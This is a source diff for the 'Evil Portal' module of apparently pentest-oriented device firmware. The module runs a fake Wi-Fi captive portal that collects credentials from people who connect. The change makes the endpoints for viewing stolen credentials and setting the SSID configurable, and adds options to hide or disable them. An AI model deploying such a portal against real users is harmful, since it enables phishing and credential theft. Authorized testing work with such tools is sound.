@@ -1,4 +1,5 @@
 #include "evil_portal.h"
+#include "core/config.h"
 #include "core/display.h"
 #include "core/mykeyboard.h"
 #include "core/sd_functions.h"
@@ -27,12 +28,18 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
     String url = request->url();
     if (url == "/") _portal->portalController(request);
     else if (url == "/post") _portal->credsController(request);
-    else if (url == "/creds") request->send(200, "text/html", _portal->creds_GET());
-    else if (url == "/ssid") request->send(200, "text/html", _portal->ssid_GET());
-    else if (url == "/postssid") {
-        if (request->hasArg("ssid")) _portal->apName = request->arg("ssid").c_str();
-        request->send(200, "text/html", _portal->ssid_POST());
-        _portal->restartWiFi();
+    else if (url == bruceConfig.evilPortalEndpoints.getCredsEndpoint &&
+             bruceConfig.evilPortalEndpoints.allowGetCreds)
+        request->send(200, "text/html", _portal->creds_GET());
+    else if (url == bruceConfig.evilPortalEndpoints.setSsidEndpoint &&
+             bruceConfig.evilPortalEndpoints.allowSetSsid) {
+        if (request->hasArg("ssid")) {
+            _portal->apName = request->arg("ssid").c_str();
+            request->send(200, "text/html", _portal->ssid_POST());
+            _portal->restartWiFi();
+        } else {
+            request->send(200, "text/html", _portal->ssid_GET());
+        }
     } else {
         if (request->args() > 0) _portal->credsController(request);
         else _portal->portalController(request);
@@ -133,17 +140,25 @@ void EvilPortal::setupRoutes() {
     // this must be done in the handleRequest() function too
     webServer.on("/", [this](AsyncWebServerRequest *request) { portalController(request); });
     webServer.on("/post", [this](AsyncWebServerRequest *request) { credsController(request); });
-    webServer.on("/creds", [this](AsyncWebServerRequest *request) {
-        request->send(200, "text/html", creds_GET());
-    });
-    webServer.on("/ssid", [this](AsyncWebServerRequest *request) {
-        request->send(200, "text/html", ssid_GET());
-    });
-    webServer.on("/postssid", [this](AsyncWebServerRequest *request) {
-        if (request->hasArg("ssid")) apName = request->arg("ssid").c_str();
-        request->send(200, "text/html", ssid_POST());
-        restartWiFi();
-    });
+    if (bruceConfig.evilPortalEndpoints.allowGetCreds) {
+        webServer.on(
+            bruceConfig.evilPortalEndpoints.getCredsEndpoint.c_str(),
+            [this](AsyncWebServerRequest *request) { request->send(200, "text/html", creds_GET()); }
+        );
+    }
+    if (bruceConfig.evilPortalEndpoints.allowSetSsid) {
+        webServer.on(
+            bruceConfig.evilPortalEndpoints.setSsidEndpoint.c_str(), [this](AsyncWebServerRequest *request) {
+                if (request->hasArg("ssid")) {
+                    apName = request->arg("ssid").c_str();
+                    request->send(200, "text/html", ssid_POST());
+                    restartWiFi();
+                } else {
+                    request->send(200, "text/html", ssid_GET());
+                }
+            }
+        );
+    }
 
     webServer.onNotFound([this](AsyncWebServerRequest *request) {
         if (request->args() > 0) credsController(request);
@@ -214,9 +229,20 @@ void EvilPortal::drawScreen() {
 
     String apIp = WiFi.softAPIP().toString();
     padprintln("");
-    padprintln("-> " + apIp + "/creds");
-    padprintln("-> " + apIp + "/ssid");
-
+    if (bruceConfig.evilPortalEndpoints.showEndpoints) {
+        if (bruceConfig.evilPortalEndpoints.allowGetCreds) {
+            padprintln("-> " + apIp + bruceConfig.evilPortalEndpoints.getCredsEndpoint + " -> get creds");
+        } else {
+            padprintln("-> credential extraction disabled in config");
+        }
+        if (bruceConfig.evilPortalEndpoints.allowSetSsid) {
+            padprintln("-> " + apIp + bruceConfig.evilPortalEndpoints.setSsidEndpoint + " -> set ssid");
+        } else {
+            padprintln("-> change of SSID disabled in config");
+        }
+    } else {
+        padprintln("Nothing to see here, move along.");
+    }
     padprintln("");
 
     if (!_verifyPwd) {
@@ -595,7 +621,9 @@ String EvilPortal::creds_GET() {
 
 String EvilPortal::ssid_GET() {
     return getHtmlTemplate(
-        "<p>Set a new SSID for Evil Portal:</p><form action='/postssid' id='login-form'><input name='ssid' "
+        "<p>Set a new SSID for Evil Portal:</p><form action='" +
+        bruceConfig.evilPortalEndpoints.setSsidEndpoint +
+        "' id='login-form'><input name='ssid' "
         "class='input-field' type='text' placeholder='" +
         apName + "' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>"
     );
